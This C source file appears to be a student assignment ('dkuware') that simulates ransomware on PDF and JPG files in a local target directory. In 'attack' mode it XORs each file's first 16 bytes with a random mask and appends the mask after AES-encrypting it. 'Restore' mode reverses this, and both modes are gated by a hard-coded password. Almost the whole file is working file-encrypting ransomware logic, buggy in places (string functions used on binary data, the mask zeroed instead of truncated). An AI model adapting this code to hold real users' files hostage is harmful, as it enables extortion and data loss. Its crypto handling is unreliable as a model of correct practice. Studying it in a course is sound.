// 학번: 32184893
// 학과: 모바일시스템공학과
// 이름: 한현민

// 11/2 (수) 할 일
// 1. 무작위 생성한 16바이트짜리 mask 생성 후 XOR 연산하여 cipherText
// 생성하여 덮어쓰기 (복호화까지 구현하면 적용하기)
// 2. mask는 AES-128 암호화하여 파일의 맨 뒷 부분에 붙이기
// (파일 포인터 새로 만들고, 이때 모드는 ab로 하여 fwrite 연산하기)
// 3. 복호화 - 맨 앞부분, 뒷부분에서 각각 cipherText, 암호화된 mask 읽어오기
// 4. mask는 password 값과 같이 AES-128 복호화하여 평문 mask 얻기
// 5. 평문 mask를 cipherText와 XOR 연산하여 plainText 얻고, 이를 맨 앞
// 16바이트에 덮어쓰기

// 이제 할 것 (11/2 수 21:50~)
// 1. 복호화 부분
// 1-1. plainText 맨 앞 16바이트에 쓰기
// 1-2. 맨 뒤에 있는 암호화된 mask 16바이트 삭제하기
// 2. 터미널 출력 부분
// 2-1. [attack], [restore] 로그 출력하기
// 2-2. 출력 노트 같이 출력하기
// 3. 마무리 : debug 코드 삭제, Makefile 작성, 프로젝트 폴더 압축 후 제출

#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "crypto.h"
#include "utils.h"

// Maximum size of string buffer
#define BUF_SIZE 256
// Maximum amount of files from ./oshw2_sample/dkuware/target
#define MAX_FILE_AMOUNT 128
// Maximum length of each filename
#define DIR_LENGTH 256

// File handling block size
#define FILE_HANDLE_BLOCK_SIZE 16

// =========== handles file directory ===========
// For counting file count to be saved in directory string array
static int pdfFileCount = 0;
unsigned char pdfList[MAX_FILE_AMOUNT][DIR_LENGTH] = {
    {
        0,
    },
};

static int jpgFileCount = 0;
unsigned char jpgList[MAX_FILE_AMOUNT][DIR_LENGTH] = {
    {
        0,
    },
};

int inputValidate(int argc, char *argv[]);

void readFileList();

// =========== handles file encrpytion / decryption ===========
static __thread int processed_pdf_count = 0;
static __thread int processed_jpg_count = 0;

void *encryption_pdfs(void *param);

void *encryption_jpgs(void *param);

void *decryption_pdfs(void *param);

void *decryption_jpgs(void *param);

int main(int argc, char *argv[]) {
  if (!inputValidate(argc, argv)) {
    return -1;
  }

  char *fileHandleMode = argv[1];
  char *password = argv[2];

  readFileList();  // read all files in target directory and save their
                   // name into each string array "pdfList" and "jpgList"
                   // depending on its filetype

  // making threads and run them
  pthread_t pdfHandleThread;
  pthread_attr_t pdfHandleThreadStatus;
  pthread_attr_init(&pdfHandleThreadStatus);

  pthread_t jpgHandleThread;
  pthread_attr_t jpgHandleThreadStatus;
  pthread_attr_init(&jpgHandleThreadStatus);

  void (*f)(void *);  // specifying thread what to do

  if (strcmp(fileHandleMode, "attack") == 0) {
    f = encryption_pdfs;
    pthread_create(&pdfHandleThread, &pdfHandleThreadStatus, f, NULL);
    pthread_join(pdfHandleThread, NULL);

    f = encryption_jpgs;
    pthread_create(&jpgHandleThread, &jpgHandleThreadStatus, f, NULL);
    pthread_join(jpgHandleThread, NULL);

  } else if (strcmp(fileHandleMode, "restore") == 0) {
    f = decryption_pdfs;
    pthread_create(&pdfHandleThread, &pdfHandleThreadStatus, f, NULL);
    pthread_join(pdfHandleThread, NULL);

    f = decryption_jpgs;
    pthread_create(&jpgHandleThread, &jpgHandleThreadStatus, f, NULL);
    pthread_join(jpgHandleThread, NULL);
  }

  printf("all processes are completed.\n");  // debug

  return 0;
}

int inputValidate(int argc, char *argv[]) {
  if (argc != 3) {
    printf("Error: Invalid Input\n");
    printf("Input example: <./filename> <attack/restore> <password>\n");
    return 0;
  }

  if (strcmp(argv[1], "attack") && strcmp(argv[1], "restore")) {
    printf("Error: Invalid Input\n");
    printf("Input example: <./filename> <attack/restore> <password>\n");
    return 0;
  }

  if (strcmp(argv[2], "password")) {
    printf("Error: Inputted password is not correct.\n");
    return 0;
  }

  return 1;
}

void readFileList() {
  char command[BUF_SIZE] = "ls ./target";
  char fileItem[DIR_LENGTH] = {
      0,
  };

  char *fileTypeLower;  // .pdf, .jpg
  char *fileTypeUpper;  // .PDF, .JPG

  FILE *pipe = popen(command, "r");

  if (!pipe) {
    perror("Command execution error");
    return;
  } else {
    while (fscanf(pipe, "%s", fileItem) > 0) {
      // when fileCount exceeds maximum index of fileItem array, then
      // escape the loop statement.
      if (pdfFileCount >= MAX_FILE_AMOUNT || jpgFileCount >= MAX_FILE_AMOUNT) {
        break;
      }

      fileTypeLower = strstr(fileItem, ".pdf\0");
      if (fileTypeLower != NULL) {
        strcpy(pdfList[pdfFileCount++], fileItem);
        memset(fileItem, 0, BUF_SIZE);
        continue;
      }

      fileTypeUpper = strstr(fileItem, ".PDF\0");
      if (fileTypeUpper != NULL) {
        strcpy(pdfList[pdfFileCount++], fileItem);
        memset(fileItem, 0, BUF_SIZE);
        continue;
      }

      fileTypeLower = strstr(fileItem, ".jpg\0");
      if (fileTypeLower != NULL) {
        strcpy(jpgList[jpgFileCount++], fileItem);
      }

      fileTypeUpper = strstr(fileItem, ".JPG\0");
      if (fileTypeUpper != NULL) {
        strcpy(jpgList[jpgFileCount++], fileItem);
      }

      memset(fileItem, 0, BUF_SIZE);
    }
  }

  pclose(pipe);
}

void *encryption_pdfs(void *param) {
  for (int i = 0; i < pdfFileCount; i++) {
    // open a single jpg file
    unsigned char *fileDir =
        (unsigned char *)malloc(sizeof(unsigned char) * BUF_SIZE);
    strcpy(fileDir, "./target/");
    strcat(fileDir, pdfList[i]);
    FILE *fp = fopen(fileDir, "rb");

    // read browsed file by 16 bytes
    unsigned char *plainText =
        (unsigned char *)malloc(sizeof(unsigned char) * FILE_HANDLE_BLOCK_SIZE);
    memset(plainText, 0, FILE_HANDLE_BLOCK_SIZE);

    // get size value
    int plainTextSize = fread(plainText, 1, FILE_HANDLE_BLOCK_SIZE, fp);
    int plainTextStringSize = strlen(plainText);

    // check plainText size is 16 or not.
    // if the size is less than 16, then give it zero padding.
    if (plainTextStringSize == FILE_HANDLE_BLOCK_SIZE) {
      printf("plainText: %s\n", plainText);  // debug
    } else if (plainTextStringSize >= 0) {
      // give plainText zero padding
      for (int i = 0; i < FILE_HANDLE_BLOCK_SIZE - plainTextStringSize; i++) {
        strcat(plainText, "0");
      }
      printf("plainText: %s\n", plainText);  // debug
    } else {
      perror("File read failure");  // exception
    }

    // generate mask randomly
    unsigned char *mask =
        (unsigned char *)malloc(sizeof(unsigned char) * FILE_HANDLE_BLOCK_SIZE);
    memset(mask, 0, FILE_HANDLE_BLOCK_SIZE);
    unsigned char segment[2] = {
        0,
    };
    for (int i = 0; i < FILE_HANDLE_BLOCK_SIZE; i++) {
      segment[0] = (unsigned char)rand();
      strcat(mask, segment);
      memset(segment, 0, 2);
    }
    printf("mask: %s / length: %ld\n", mask, strlen(mask));  // debug

    // do XOR calculation on plainText with randomly generated mask
    unsigned char cipherText[FILE_HANDLE_BLOCK_SIZE] = {
        0,
    };
    printf("cipherText: ");  // debug
    for (int i = 0; i < FILE_HANDLE_BLOCK_SIZE; i++) {
      cipherText[i] = plainText[i] ^ mask[i];
      printf("%c", cipherText[i]);  // debug
    }
    printf("\n");  // debug

    // overwrite cipherText on the head of target file
    FILE *overwrite_fp = fopen(fileDir, "r+b");
    fwrite(cipherText, 1, 16, overwrite_fp);  // write cipherText on target
    fclose(overwrite_fp);

    // mask를 AES-128 알고리즘으로 암호화
    mask = aes_128_encryption(mask);
    printf("after encryption: %s\n", mask);  // debug

    // overwrite encrypted mask on the tail of target file
    overwrite_fp = fopen(fileDir, "ab");
    fwrite(mask, 1, 16, overwrite_fp);  // write encrypted mask on target
    fclose(overwrite_fp);

    free(mask);
    free(plainText);
    fclose(fp);
    free(fileDir);

    processed_pdf_count++;
  }

  return NULL;
}

void *encryption_jpgs(void *param) {
  for (int i = 0; i < jpgFileCount; i++) {
    // open a single jpg file
    unsigned char *fileDir =
        (unsigned char *)malloc(sizeof(unsigned char) * BUF_SIZE);
    strcpy(fileDir, "./target/");
    strcat(fileDir, jpgList[i]);
    FILE *fp = fopen(fileDir, "rb");

    // read browsed file by 16 bytes
    unsigned char *plainText =
        (unsigned char *)malloc(sizeof(unsigned char) * FILE_HANDLE_BLOCK_SIZE);
    memset(plainText, 0, FILE_HANDLE_BLOCK_SIZE);

    // get size value
    int plainTextSize = fread(plainText, 1, FILE_HANDLE_BLOCK_SIZE, fp);
    int plainTextStringSize = strlen(plainText);

    // check plainText size is 16 or not.
    // if the size is less than 16, then give it zero padding.
    if (plainTextStringSize == FILE_HANDLE_BLOCK_SIZE) {
      printf("plainText: %s\n", plainText);  // debug
    } else if (plainTextStringSize >= 0) {
      // give plainText zero padding
      for (int i = 0; i < FILE_HANDLE_BLOCK_SIZE - plainTextStringSize; i++) {
        strcat(plainText, "0");
      }
      printf("plainText: %s\n", plainText);  // debug
    } else {
      perror("File read failure");  // exception
    }

    // generate mask randomly
    unsigned char *mask =
        (unsigned char *)malloc(sizeof(unsigned char) * FILE_HANDLE_BLOCK_SIZE);
    memset(mask, 0, FILE_HANDLE_BLOCK_SIZE);
    unsigned char segment[2] = {
        0,
    };
    for (int i = 0; i < FILE_HANDLE_BLOCK_SIZE; i++) {
      segment[0] = (unsigned char)rand();
      strcat(mask, segment);
      memset(segment, 0, 2);
    }
    printf("mask: %s / length: %ld\n", mask, strlen(mask));  // debug

    // do XOR calculation on plainText with randomly generated mask
    unsigned char cipherText[FILE_HANDLE_BLOCK_SIZE] = {
        0,
    };
    printf("cipherText: ");  // debug
    for (int i = 0; i < FILE_HANDLE_BLOCK_SIZE; i++) {
      cipherText[i] = plainText[i] ^ mask[i];
      printf("%c", cipherText[i]);  // debug
    }
    printf("\n");

    // overwrite cipherText on the head of target file
    FILE *overwrite_fp = fopen(fileDir, "r+b");
    printf("%ld\n", ftell(overwrite_fp));
    fwrite(cipherText, 1, 16, overwrite_fp);  // write cipherText on target
    fclose(overwrite_fp);

    // mask를 AES-128 알고리즘으로 암호화
    mask = aes_128_encryption(mask);
    printf("after encryption: %s\n", mask);  // debug

    // overwrite encrypted mask on the tail of target file
    overwrite_fp = fopen(fileDir, "ab");
    fwrite(mask, 1, 16, overwrite_fp);  // write encrypted mask on target
    fclose(overwrite_fp);

    free(mask);
    free(plainText);
    fclose(fp);
    free(fileDir);

    processed_jpg_count++;
  }

  return NULL;
}

void *decryption_pdfs(void *param) {
  for (int i = 0; i < pdfFileCount; i++) {
    // open a single jpg file
    unsigned char *fileDir =
        (unsigned char *)malloc(sizeof(unsigned char) * BUF_SIZE);
    strcpy(fileDir, "./target/");
    strcat(fileDir, pdfList[i]);
    FILE *payload_fp = fopen(fileDir, "rb");
    FILE *mask_fp = fopen(fileDir, "rb");
    fseek(mask_fp, -FILE_HANDLE_BLOCK_SIZE, SEEK_END);

    // read browsed file by 16 bytes
    unsigned char *cipherText =
        (unsigned char *)malloc(sizeof(unsigned char) * FILE_HANDLE_BLOCK_SIZE);
    memset(cipherText, 0, FILE_HANDLE_BLOCK_SIZE);
    // get size value
    int cipherTextSize =
        fread(cipherText, 1, FILE_HANDLE_BLOCK_SIZE, payload_fp);
    int cipherTextStringSize = strlen(cipherText);

    // read browsed file by 16 bytes
    unsigned char *mask =
        (unsigned char *)malloc(sizeof(unsigned char) * FILE_HANDLE_BLOCK_SIZE);
    memset(mask, 0, FILE_HANDLE_BLOCK_SIZE);
    // get size value
    int maskSize = fread(mask, 1, FILE_HANDLE_BLOCK_SIZE, mask_fp);
    int maskTextStringSize = strlen(mask);

    printf("cipherText: %s / length: %d\n", cipherText,
           cipherTextStringSize);                                 // debug
    printf("mask: %s / length: %d\n", mask, maskTextStringSize);  // debug

    mask = aes_128_decryption(mask);
    printf("decrypted mask: %s / length: %d\n", mask,
           maskTextStringSize);  // debug

    // do XOR calculation on plainText with randomly generated mask
    unsigned char plainText[FILE_HANDLE_BLOCK_SIZE] = {
        0,
    };
    printf("plainText: ");  // debug
    for (int i = 0; i < FILE_HANDLE_BLOCK_SIZE; i++) {
      plainText[i] = cipherText[i] ^ mask[i];
      printf("%c", plainText[i]);  // debug
    }
    printf("\n");

    // write plainText in the head of file
    fclose(payload_fp);
    payload_fp = fopen(fileDir, "r+b");
    fwrite(plainText, 1, FILE_HANDLE_BLOCK_SIZE, payload_fp);

    // erase mask in the tail of file
    fclose(mask_fp);
    mask_fp = fopen(fileDir, "r+b");
    fseek(mask_fp, -FILE_HANDLE_BLOCK_SIZE, SEEK_END);
    char eraser[1] = {'\0'};
    for (int i = 0; i < FILE_HANDLE_BLOCK_SIZE; i++) {
      fwrite(eraser, 1, 1, mask_fp);  // overwrite null character in 16 times
    }

    free(mask);
    free(cipherText);
    fclose(mask_fp);
    fclose(payload_fp);
    free(fileDir);

    processed_pdf_count++;
  }

  return NULL;
}

void *decryption_jpgs(void *param) {
  for (int i = 0; i < jpgFileCount; i++) {
    // open a single jpg file
    unsigned char *fileDir =
        (unsigned char *)malloc(sizeof(unsigned char) * BUF_SIZE);
    strcpy(fileDir, "./target/");
    strcat(fileDir, jpgList[i]);
    FILE *payload_fp = fopen(fileDir, "rb");
    FILE *mask_fp = fopen(fileDir, "rb");
    fseek(mask_fp, -FILE_HANDLE_BLOCK_SIZE, SEEK_END);

    // read browsed file by 16 bytes
    unsigned char *cipherText =
        (unsigned char *)malloc(sizeof(unsigned char) * FILE_HANDLE_BLOCK_SIZE);
    memset(cipherText, 0, FILE_HANDLE_BLOCK_SIZE);
    // get size value
    int cipherTextSize =
        fread(cipherText, 1, FILE_HANDLE_BLOCK_SIZE, payload_fp);
    int cipherTextStringSize = strlen(cipherText);

    // read browsed file by 16 bytes
    unsigned char *mask =
        (unsigned char *)malloc(sizeof(unsigned char) * FILE_HANDLE_BLOCK_SIZE);
    memset(mask, 0, FILE_HANDLE_BLOCK_SIZE);
    // get size value
    int maskSize = fread(mask, 1, FILE_HANDLE_BLOCK_SIZE, mask_fp);
    int maskTextStringSize = strlen(mask);

    printf("cipherText: %s / length: %d\n", cipherText,
           cipherTextStringSize);                                 // debug
    printf("mask: %s / length: %d\n", mask, maskTextStringSize);  // debug

    mask = aes_128_decryption(mask);
    printf("decrypted mask: %s / length: %d\n", mask,
           maskTextStringSize);  // debug

    // do XOR calculation on plainText with randomly generated mask
    unsigned char plainText[FILE_HANDLE_BLOCK_SIZE] = {
        0,
    };
    printf("plainText: ");  // debug
    for (int i = 0; i < FILE_HANDLE_BLOCK_SIZE; i++) {
      plainText[i] = cipherText[i] ^ mask[i];
      printf("%c", plainText[i]);  // debug
    }
    printf("\n");

    // write plainText in the head of file
    fclose(payload_fp);
    payload_fp = fopen(fileDir, "r+b");
    fwrite(plainText, 1, FILE_HANDLE_BLOCK_SIZE, payload_fp);

    // erase mask in the tail of file
    fclose(mask_fp);
    mask_fp = fopen(fileDir, "r+b");
    fseek(mask_fp, -FILE_HANDLE_BLOCK_SIZE, SEEK_END);
    char eraser[1] = {'\0'};
    for (int i = 0; i < FILE_HANDLE_BLOCK_SIZE; i++) {
      fwrite(eraser, 1, 1, mask_fp);  // overwrite null character in 16 times
    }

    free(mask);
    free(cipherText);
    fclose(mask_fp);
    fclose(payload_fp);
    free(fileDir);

    processed_jpg_count++;
  }

  return NULL;
}